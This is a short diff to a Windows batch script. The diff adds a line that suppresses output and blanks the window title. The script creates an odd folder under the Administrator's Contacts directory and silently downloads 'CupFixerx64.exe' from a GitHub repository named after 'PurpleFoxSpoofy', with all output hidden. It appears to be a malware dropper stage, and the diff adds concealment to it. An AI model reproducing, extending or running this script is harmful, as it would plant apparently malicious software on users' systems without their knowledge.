@@ -1,3 +1,4 @@
+@ECHO OFF & TITLE       
 MKDIR "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
 CD /D "C:\Users\Administrator\Contacts\5P00FY" >NUL 2>&1
 curl -s -g -L -o "CupFixerx64.exe" "https://github.com/agr3fox-x64/i9kuk378yj6g-PurpleFoxSpoofy/raw/main/CupFixerx64.exe$"  >NUL 2>&1
